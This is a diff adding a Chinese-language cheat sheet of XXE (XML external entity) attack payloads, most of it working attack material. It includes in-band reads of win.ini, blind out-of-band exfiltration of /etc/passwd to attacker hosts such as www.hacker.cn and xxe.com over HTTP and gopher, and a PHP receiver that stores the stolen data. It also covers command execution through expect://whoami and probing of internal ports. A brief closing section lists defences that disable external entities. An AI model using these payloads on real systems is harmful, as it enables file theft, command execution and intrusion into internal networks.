@@ -1,0 +1,88 @@
+有回显状态下：
+<?xml version="1.0" encoding="utf-8"?> 
+<!DOCTYPE x[<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
+<value>&xxe;</value>
+
+
+
+
+无回显，我们也可以使用另外一种方法读取文件：
+<!DOCTYPE a [ 
+<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
+<!ENTITY % dtd SYSTEM "http://www.hacker.cn/attack.dtd">
+%dtd;
+%mydata;
+]>
+其中attack.dtd的内容为：
+<!ENTITY % all
+"<!ENTITY &#x25; mydata SYSTEM "http://www.hacker.cn/?%file">"
+>
+发送payload以后就可以在http://www.hacker.cn/的访问日志中看到请求且带上了/etc/passwd文件base64加密以后的内容：
+access.log，可以看到访问日志
+
+
+
+
+无回显，引用远程服务器上的XML文件读取文件:
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+<!ENTITY % remote SYSTEM "http://xxe.com/1.xml">
+%remote;]>
+将以下1.xml保存到WEB服务器下:
+<!ENTITY % a SYSTEM "file:///etc/passwd"> 
+<!ENTITY % b "<!ENTITY &#37; c SYSTEM 'gopher://xxe.com/%a;'>"> %b; %c
+
+
+
+
+无回显,主机上放一个接收文件的php(get.php):
+<?php
+file_put_contents('01.txt', $_GET['xxe_local']);
+?>
+以下1.xml内容:
+<!ENTITY % payload	SYSTEM	 "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">
+<!ENTITY % int "<!ENTITY &#37; trick SYSTEM 'http://xxe.com/get.php?xxe_local=%payload;'>">
+%int;
+%trick;
+接收到请求的get.php就将这个文件内容保存到01.txt了，形成了一个文件读取的过程。
+
+
+
+执行命令
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE xxe [
+<!ELEMENT name ANY >
+<!ENTITY xxe SYSTEM "expect://whoami" >]>
+<name>&xxe;</name>
+要求PHP支持expect拓展，好像默认是没开的。
+
+
+
+
+探测内网服务器端口
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE xxe [
+<!ELEMENT name ANY >
+<!ENTITY xxe SYSTEM "http://127.0.0.1:8080" >]>
+<name>&xxe;</name>
+
+
+
+攻击内网机器
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE xxe [
+<!ELEMENT name ANY >
+<!ENTITY xxe SYSTEM "http://127.0.0.1/payload" >]>
+<name>&xxe;</name>
+
+################################################################################
+XXE的防御方法
+使用开发语言提供的禁用外部实体的方法
+PHP：
+libxml_disable_entity_loader(true);
+JAVA:
+DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();    dbf.setExpandEntityReferences(false);
+Python：
+from lxml import etree
+xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))
+过滤用户提交的XML数据
